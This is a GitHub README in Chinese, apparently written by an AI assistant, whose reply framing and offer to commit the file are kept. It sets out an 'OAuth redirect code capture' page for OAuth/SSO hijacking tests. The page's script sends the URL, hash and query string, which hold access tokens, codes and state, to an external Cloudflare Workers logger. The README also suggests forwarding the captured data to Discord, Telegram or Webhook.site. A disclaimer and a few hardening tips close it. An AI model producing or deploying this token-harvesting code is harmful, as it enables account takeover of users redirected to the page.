# oauth-test-redirect
好的，以下是专门为你当前使用 Cloudflare Workers 收集 OAuth/SSO 跳转信息的项目编写的 `README.md` 文件，可直接放入你的 GitHub 仓库中：

---

### 📄 README.md

````markdown
# OAuth Redirect Code 捕获页面

本项目用于测试 OAuth / SSO 劫持类漏洞，通过跳转到本页面来自动捕获 URL 中的 `code`、`access_token`、`state` 等参数，并将其发送至 Cloudflare Workers 后端接口用于记录。

## 🎯 使用场景

- OAuth 隐式授权模式（使用 `#access_token=xxx`）
- OAuth 授权码模式（使用 `?code=xxx&state=yyy`）
- SSO 登录回调参数拦截测试
- 用于白帽测试、漏洞验证等合法授权目的

## 🚀 如何部署

### 1. 前端页面（callback.html）

将以下 HTML 页面托管在 GitHub Pages（或任意支持静态托管的平台）：

```html
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>OAuth</title></head>
<body>
<script>
  (function () {
    const data = {
      href: location.href,
      hash: location.hash,
      search: location.search
    };
    fetch("https://oauth-logger.1478972479.workers.dev/", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    });
  })();
</script>
</body>
</html>
````

> 📌 示例部署地址：[https://githubkey.github.io/oauth-test-redirect/callback.html](https://githubkey.github.io/oauth-test-redirect/callback.html)

### 2. Cloudflare Workers 后端（用于接收数据）

* 在 [Cloudflare Workers](https://workers.cloudflare.com/) 控制台新建一个 Worker
* 配置脚本如下：

```js
export default {
  async fetch(request) {
    const body = await request.text();
    console.log("📥 OAuth Redirect Data:", body);
    return new Response("OK");
  }
}
```

你也可以添加更详细的日志记录逻辑，比如转发到 Discord、Telegram、Webhook.site、存数据库等。

## 🛡️ 安全说明

⚠️ 本工具仅供授权测试用途（如 SRC、渗透演示、课堂教学），禁止用于非法活动。

如果你是开发者或安全团队，请确保你的 OAuth 实现中：

* 不允许任意 `redirect_uri` 外部跳转
* 验证 `state` 参数是否一致
* 避免泄露 `code` / `access_token` 到第三方页面

## 📬 联系

由白帽安全研究者部署与测试。如需协助或演示，请联系项目作者。

```

---

需要我顺便帮你把这个 `README.md` 提交到 GitHub 仓库中？你也可以把上面的内容直接复制粘贴到 GitHub 网页端的“创建新文件”页面中。需要帮忙操作的也可以说。
```
